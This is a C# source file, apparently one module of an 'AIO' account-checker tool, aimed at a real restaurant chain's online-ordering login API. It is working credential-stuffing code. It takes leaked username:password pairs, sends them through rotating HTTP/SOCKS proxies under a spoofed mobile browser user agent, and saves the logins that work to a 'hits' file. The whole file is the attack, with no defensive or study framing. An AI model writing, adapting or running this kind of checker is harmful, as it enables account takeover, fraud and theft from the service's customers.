using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace OutbackSteakHouse
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Mobile Safari/537.36";
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = true;
                        string str = "grant_type=password&username=" + s[0] + "&password=" + s[1];
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                        new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string text2 = httpRequest.Post("https://togo.outbackonlineordering.com/api/account/login", str, "application/x-www-form-urlencoded").ToString();
                        bool flag7 = text2.Contains("access_token");

                        if (flag7)
                        {
                            ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - OUTBACK] " + s[0] + ":" + s[1], Color.Green);
                                }
                                Export.AsResult("/Outbacksteakhouse_hits", s[0] + ":" + s[1]);
                                return false;
                            }
                        else
                        {
                                ZeusAIO.mainmenu.errors++;
                                goto Retry;
                            }
                    }
                    break;
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }
    }
}
